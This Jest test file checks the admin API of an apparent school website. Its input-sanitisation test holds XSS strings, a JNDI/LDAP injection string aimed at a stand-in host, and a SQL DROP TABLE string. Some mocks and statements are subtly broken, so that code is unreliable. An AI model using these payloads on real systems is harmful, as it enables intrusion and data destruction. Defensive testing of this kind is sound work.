/**
 * Administration API Tests
 * Administration API 測試
 * 
 * Comprehensive tests for critical admin endpoints including user management,
 * permission upgrades, and system administration
 */

import { NextRequest } from 'next/server'
import { 
  mockUsers,
  TestAuthHelpers,
  TestAPIHelpers,
  TestValidationHelpers,
  TestPerformanceHelpers,
  mockEntities
} from '../utils/test-helpers'

// Mock prisma
const mockPrisma = {
  user: {
    findMany: jest.fn(),
    findUnique: jest.fn(),
    create: jest.fn(),
    update: jest.fn(),
    delete: jest.fn(),
    count: jest.fn()
  },
  userRole: {
    createMany: jest.fn(),
    deleteMany: jest.fn()
  },
  permissionUpgradeRequest: {
    findMany: jest.fn(),
    create: jest.fn(),
    update: jest.fn()
  },
  announcement: {
    findMany: jest.fn(),
    create: jest.fn(),
    update: jest.fn(),
    delete: jest.fn()
  }
}

jest.mock('@/lib/prisma', () => ({ prisma: mockPrisma }))

// Mock middleware
jest.mock('@/lib/middleware', () => ({
  requireAdmin: jest.fn(),
  requireAuth: jest.fn(),
  requireTeacher: jest.fn()
}))

// Mock auth utilities
jest.mock('@/lib/auth', () => ({
  hashPassword: jest.fn().mockResolvedValue('hashed-password-123'),
  getCurrentUser: jest.fn(),
  isAdmin: jest.fn(),
  isOfficeMember: jest.fn()
}))

// Import handlers
import { GET as usersGET, POST as usersPOST } from '@/app/api/admin/users/route'
import { GET as userGET, PUT as userPUT, DELETE as userDELETE } from '@/app/api/admin/users/[id]/route'
import { POST as approveUserPOST } from '@/app/api/admin/users/[id]/approve/route'
import { DELETE as rejectUserDELETE } from '@/app/api/admin/users/[id]/reject/route'
import { GET as upgradeRequestsGET } from '@/app/api/admin/upgrade-requests/route'
import { POST as reviewUpgradePOST } from '@/app/api/admin/upgrade-requests/[id]/review/route'
import { GET as announcementsGET, POST as announcementsPOST } from '@/app/api/admin/announcements/route'

// Import mocked modules for type checking
import { requireAdmin, requireAuth } from '@/lib/middleware'
import { hashPassword } from '@/lib/auth'

describe('Administration API Endpoints', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('User Management - /api/admin/users', () => {
    describe('GET /api/admin/users - List Users', () => {
      test('should return paginated user list for admin', async () => {
        const mockUserList = [
          { ...mockUsers.admin, userRoles: [{ role: { name: 'admin' } }] },
          { ...mockUsers.viewer, userRoles: [{ role: { name: 'viewer' } }] }
        ]
        
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findMany.mockResolvedValue(mockUserList)
        mockPrisma.user.count.mockResolvedValue(2)
        
        const request = new NextRequest('http://localhost:3000/api/admin/users?page=1&limit=20', {
          method: 'GET'
        })
        
        const response = await usersGET(request)
        const data = await response.json()
        
        expect(response.status).toBe(200)
        expect(data.success).toBe(true)
        expect(data.data.users).toHaveLength(2)
        expect(data.data.pagination.totalCount).toBe(2)
        expect(mockPrisma.user.findMany).toHaveBeenCalledWith(
          expect.objectContaining({
            skip: 0,
            take: 20
          })
        )
      })

      test('should filter users by role', async () => {
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findMany.mockResolvedValue([mockUsers.admin])
        mockPrisma.user.count.mockResolvedValue(1)
        
        const request = new NextRequest('http://localhost:3000/api/admin/users?role=admin', {
          method: 'GET'
        })
        
        const response = await usersGET(request)
        const data = await response.json()
        
        expect(response.status).toBe(200)
        expect(data.success).toBe(true)
        expect(mockPrisma.user.findMany).toHaveBeenCalledWith(
          expect.objectContaining({
            where: expect.objectContaining({
              isActive: true,
              userRoles: {
                some: {
                  role: { name: 'admin' }
                }
              }
            })
          })
        )
      })

      test('should search users by name/email', async () => {
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findMany.mockResolvedValue([mockUsers.viewer])
        mockPrisma.user.count.mockResolvedValue(1)
        
        const request = new NextRequest('http://localhost:3000/api/admin/users?search=viewer', {
          method: 'GET'
        })
        
        const response = await usersGET(request)
        
        expect(response.status).toBe(200)
        expect(mockPrisma.user.findMany).toHaveBeenCalledWith(
          expect.objectContaining({
            where: expect.objectContaining({
              OR: expect.arrayContaining([
                { email: { contains: 'viewer', mode: 'insensitive' } },
                { displayName: { contains: 'viewer', mode: 'insensitive' } }
              ])
            })
          })
        )
      })

      test('should return 401 for non-admin users', async () => {
        const mockErrorResponse = TestAPIHelpers.mockErrorResponse('Access denied', 403)
        (requireAdmin as jest.Mock).mockResolvedValue(mockErrorResponse)
        
        const request = new NextRequest('http://localhost:3000/api/admin/users', {
          method: 'GET'
        })
        
        const result = await usersGET(request)
        expect(result.status).toBe(403)
      })
    })

    describe('POST /api/admin/users - Create User', () => {
      test('should create user successfully', async () => {
        const newUserData = {
          email: 'newuser@kcislk.com',
          password: 'SecurePassword123',
          firstName: 'New',
          lastName: 'User',
          displayName: 'New User',
          phone: '+1234567890',
          roles: [1, 2] // Admin and viewer roles
        }

        const createdUser = {
          id: 'new-user-id',
          email: newUserData.email,
          firstName: newUserData.firstName,
          lastName: newUserData.lastName,
          displayName: newUserData.displayName,
          phone: newUserData.phone,
          isActive: true,
          createdAt: new Date()
        }
        
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findUnique.mockResolvedValue(null) // No existing user
        mockPrisma.user.create.mockResolvedValue(createdUser)
        (hashPassword as jest.Mock).mockResolvedValue('hashed-password-123')
        
        const request = new NextRequest('http://localhost:3000/api/admin/users', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(newUserData)
        })
        
        const response = await usersPOST(request)
        const data = await response.json()
        
        expect(response.status).toBe(201)
        expect(data.success).toBe(true)
        expect(data.data.user.email).toBe(newUserData.email)
        expect(mockPrisma.user.create).toHaveBeenCalledWith(
          expect.objectContaining({
            data: expect.objectContaining({
              email: newUserData.email,
              passwordHash: 'hashed-password-123',
              emailVerified: true,
              isActive: true
            })
          })
        )
      })

      test('should validate required fields', async () => {
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        
        const invalidData = {
          email: '', // Missing required field
          password: 'password'
        }
        
        const request = new NextRequest('http://localhost:3000/api/admin/users', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(invalidData)
        })
        
        const response = await usersPOST(request)
        const data = await response.json()
        
        expect(response.status).toBe(400)
        expect(data.success).toBe(false)
        expect(data.error).toBe('Missing required fields')
      })

      test('should prevent duplicate email addresses', async () => {
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findUnique.mockResolvedValue(mockUsers.viewer) // Email exists
        
        const duplicateUserData = {
          email: 'viewer@kcislk.com',
          password: 'password123',
          firstName: 'Duplicate',
          lastName: 'User'
        }
        
        const request = new NextRequest('http://localhost:3000/api/admin/users', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(duplicateUserData)
        })
        
        const response = await usersPOST(request)
        const data = await response.json()
        
        expect(response.status).toBe(400)
        expect(data.success).toBe(false)
        expect(data.error).toBe('Email already exists')
      })
    })

    describe('PUT /api/admin/users/[id] - Update User', () => {
      test('should update user successfully', async () => {
        const updateData = {
          firstName: 'Updated',
          lastName: 'Name',
          phone: '+9876543210',
          isActive: true
        }

        const updatedUser = { ...mockUsers.viewer, ...updateData }
        
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findUnique.mockResolvedValue(mockUsers.viewer)
        mockPrisma.user.update.mockResolvedValue(updatedUser)
        
        // Create mock request with params
        const request = new NextRequest('http://localhost:3000/api/admin/users/viewer-user-id', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(updateData)
        })
        
        // Mock the params object that would be passed by Next.js
        const mockParams = { params: { id: 'viewer-user-id' } }
        
        const response = await userPUT(request, mockParams)
        const data = await response.json()
        
        expect(response.status).toBe(200)
        expect(data.success).toBe(true)
        expect(data.data.user.firstName).toBe('Updated')
        expect(mockPrisma.user.update).toHaveBeenCalledWith(
          expect.objectContaining({
            where: { id: 'viewer-user-id' },
            data: updateData
          })
        )
      })

      test('should return 404 for non-existent user', async () => {
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findUnique.mockResolvedValue(null)
        
        const request = new NextRequest('http://localhost:3000/api/admin/users/non-existent', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ firstName: 'Updated' })
        })
        
        const mockParams = { params: { id: 'non-existent' } }
        const response = await userPUT(request, mockParams)
        const data = await response.json()
        
        expect(response.status).toBe(404)
        expect(data.success).toBe(false)
        expect(data.error).toBe('User not found')
      })
    })

    describe('DELETE /api/admin/users/[id] - Delete User', () => {
      test('should delete user successfully', async () => {
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findUnique.mockResolvedValue(mockUsers.viewer)
        mockPrisma.user.delete.mockResolvedValue(mockUsers.viewer)
        
        const request = new NextRequest('http://localhost:3000/api/admin/users/viewer-user-id', {
          method: 'DELETE'
        })
        
        const mockParams = { params: { id: 'viewer-user-id' } }
        const response = await userDELETE(request, mockParams)
        const data = await response.json()
        
        expect(response.status).toBe(200)
        expect(data.success).toBe(true)
        expect(data.message).toContain('deleted successfully')
        expect(mockPrisma.user.delete).toHaveBeenCalledWith({
          where: { id: 'viewer-user-id' }
        })
      })

      test('should prevent admin from deleting themselves', async () => {
        (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
        mockPrisma.user.findUnique.mockResolvedValue(mockUsers.admin)
        
        const request = new NextRequest('http://localhost:3000/api/admin/users/admin-user-id', {
          method: 'DELETE'
        })
        
        const mockParams = { params: { id: 'admin-user-id' } }
        const response = await userDELETE(request, mockParams)
        const data = await response.json()
        
        expect(response.status).toBe(400)
        expect(data.success).toBe(false)
        expect(data.error).toBe('Cannot delete your own account')
      })
    })
  })

  describe('User Approval System - /api/admin/users/[id]/approve-reject', () => {
    test('should approve user successfully', async () => {
      const pendingUser = {
        ...mockUsers.viewer,
        isActive: false,
        userRoles: []
      }
      
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.user.findUnique.mockResolvedValue(pendingUser)
      mockPrisma.user.update.mockResolvedValue({ ...pendingUser, isActive: true })
      mockPrisma.userRole.createMany.mockResolvedValue({ count: 1 })
      
      const request = new NextRequest('http://localhost:3000/api/admin/users/viewer-user-id/approve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ roles: [3] }) // Viewer role
      })
      
      const mockParams = { params: { id: 'viewer-user-id' } }
      const response = await approveUserPOST(request, mockParams)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.message).toContain('approved')
      expect(mockPrisma.user.update).toHaveBeenCalledWith(
        expect.objectContaining({
          where: { id: 'viewer-user-id' },
          data: { isActive: true }
        })
      )
    })

    test('should reject user successfully', async () => {
      const pendingUser = {
        ...mockUsers.viewer,
        isActive: false
      }
      
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.user.findUnique.mockResolvedValue(pendingUser)
      mockPrisma.user.delete.mockResolvedValue(pendingUser)
      
      const request = new NextRequest('http://localhost:3000/api/admin/users/viewer-user-id/reject', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ reason: 'Invalid credentials' })
      })
      
      const mockParams = { params: { id: 'viewer-user-id' } }
      const response = await rejectUserDELETE(request, mockParams)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.message).toContain('rejected')
      expect(mockPrisma.user.delete).toHaveBeenCalledWith({
        where: { id: 'viewer-user-id' }
      })
    })
  })

  describe('Permission Upgrade System - /api/admin/upgrade-requests', () => {
    test('should list upgrade requests', async () => {
      const mockRequests = [
        {
          id: 1,
          userId: 'user-1',
          requestedRole: 'office_member',
          reason: 'Need access to manage events',
          status: 'pending',
          createdAt: new Date(),
          user: {
            email: 'user1@kcislk.com',
            displayName: 'User One'
          }
        }
      ]
      
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.permissionUpgradeRequest.findMany.mockResolvedValue(mockRequests)
      
      const request = new NextRequest('http://localhost:3000/api/admin/upgrade-requests', {
        method: 'GET'
      })
      
      const response = await upgradeRequestsGET(request)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.data.requests).toHaveLength(1)
      expect(data.data.requests[0].requestedRole).toBe('office_member')
    })

    test('should review upgrade request', async () => {
      const reviewData = {
        action: 'approve',
        reason: 'User demonstrates need for elevated access'
      }
      
      const mockRequest = {
        id: 1,
        userId: 'user-1',
        requestedRole: 'office_member',
        status: 'pending'
      }
      
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.permissionUpgradeRequest.findUnique.mockResolvedValue(mockRequest)
      mockPrisma.permissionUpgradeRequest.update.mockResolvedValue({
        ...mockRequest,
        status: 'approved'
      })
      
      const request = new NextRequest('http://localhost:3000/api/admin/upgrade-requests/1/review', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(reviewData)
      })
      
      const mockParams = { params: { id: '1' } }
      const response = await reviewUpgradePOST(request, mockParams)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.message).toContain('approved')
    })
  })

  describe('Announcement Management - /api/admin/announcements', () => {
    test('should create announcement', async () => {
      const announcementData = {
        title: 'Important School Update',
        content: '<p>Please note the upcoming schedule change.</p>',
        summary: 'Schedule change notification',
        targetAudience: 'all',
        priority: 'high',
        publishedAt: new Date().toISOString()
      }
      
      const createdAnnouncement = {
        id: 1,
        ...announcementData,
        authorId: mockUsers.admin.id,
        status: 'published',
        createdAt: new Date(),
        updatedAt: new Date()
      }
      
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.announcement.create.mockResolvedValue(createdAnnouncement)
      
      const request = new NextRequest('http://localhost:3000/api/admin/announcements', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(announcementData)
      })
      
      const response = await announcementsPOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(201)
      expect(data.success).toBe(true)
      expect(data.data.announcement.title).toBe(announcementData.title)
      expect(mockPrisma.announcement.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            title: announcementData.title,
            authorId: mockUsers.admin.id
          })
        })
      )
    })
  })

  describe('Security Tests', () => {
    test('should validate admin permissions on all endpoints', async () => {
      const mockErrorResponse = TestAPIHelpers.mockErrorResponse('Access denied', 403)
      (requireAdmin as jest.Mock).mockResolvedValue(mockErrorResponse)
      
      const endpoints = [
        { handler: usersGET, method: 'GET', url: '/api/admin/users' },
        { handler: usersPOST, method: 'POST', url: '/api/admin/users' },
        { handler: upgradeRequestsGET, method: 'GET', url: '/api/admin/upgrade-requests' }
      ]
      
      for (const { handler, method, url } of endpoints) {
        const request = new NextRequest(`http://localhost:3000${url}`, {
          method,
          headers: method === 'POST' ? { 'Content-Type': 'application/json' } : {},
          body: method === 'POST' ? JSON.stringify({}) : undefined
        })
        
        const result = await handler(request)
        expect(result.status).toBe(403)
      }
    })

    test('should sanitize user input', async () => {
      const maliciousData = {
        email: '<script>alert("xss")</script>@domain.com',
        firstName: '${jndi:ldap://malicious.com}',
        lastName: '<img src=x onerror=alert("xss")>',
        displayName: 'DROP TABLE users;--'
      }
      
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.user.findUnique.mockResolvedValue(null)
      mockPrisma.user.create.mockResolvedValue({ id: 'test-user', email: 'sanitized@domain.com' })
      
      const request = new NextRequest('http://localhost:3000/api/admin/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...maliciousData, password: 'validpassword123' })
      })
      
      const response = await usersPOST(request)
      
      // Should not crash and should handle malicious input safely
      expect(response.status).toBeGreaterThanOrEqual(200)
      expect(response.status).toBeLessThan(600)
    })

    test('should rate limit admin operations', async () => {
      // This would be implemented with actual rate limiting
      // For now, we test that endpoints are available
      expect(typeof usersGET).toBe('function')
      expect(typeof usersPOST).toBe('function')
      expect(typeof upgradeRequestsGET).toBe('function')
    })
  })

  describe('Performance Tests', () => {
    test('user list endpoint should be performant', async () => {
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.user.findMany.mockResolvedValue([mockUsers.admin])
      mockPrisma.user.count.mockResolvedValue(1)
      
      const request = new NextRequest('http://localhost:3000/api/admin/users', {
        method: 'GET'
      })
      
      const { executionTime } = await TestPerformanceHelpers.measureExecutionTime(
        () => usersGET(request),
        'Admin User List'
      )
      
      expect(executionTime).toBeLessThan(1000) // Should complete within 1 second
    })

    test('user creation should be fast', async () => {
      const newUserData = {
        email: 'performance@test.com',
        password: 'password123',
        firstName: 'Performance',
        lastName: 'Test'
      }
      
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.user.findUnique.mockResolvedValue(null)
      mockPrisma.user.create.mockResolvedValue({ id: 'perf-test', ...newUserData })
      
      const request = new NextRequest('http://localhost:3000/api/admin/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newUserData)
      })
      
      const { executionTime } = await TestPerformanceHelpers.measureExecutionTime(
        () => usersPOST(request),
        'User Creation'
      )
      
      expect(executionTime).toBeLessThan(2000) // Should complete within 2 seconds
    })
  })

  describe('Error Handling', () => {
    test('should handle database connection errors gracefully', async () => {
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      mockPrisma.user.findMany.mockRejectedValue(new Error('Database connection failed'))
      
      const request = new NextRequest('http://localhost:3000/api/admin/users', {
        method: 'GET'
      })
      
      const response = await usersGET(request)
      const data = await response.json()
      
      expect(response.status).toBe(500)
      expect(data.success).toBe(false)
      expect(data.error).toBe('Failed to fetch users')
    })

    test('should handle malformed JSON gracefully', async () => {
      (requireAdmin as jest.Mock).mockResolvedValue(mockUsers.admin)
      
      const request = new NextRequest('http://localhost:3000/api/admin/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid-json-{'
      })
      
      const response = await usersPOST(request)
      
      expect(response.status).toBeGreaterThanOrEqual(400)
      expect(response.status).toBeLessThan(600)
    })
  })
})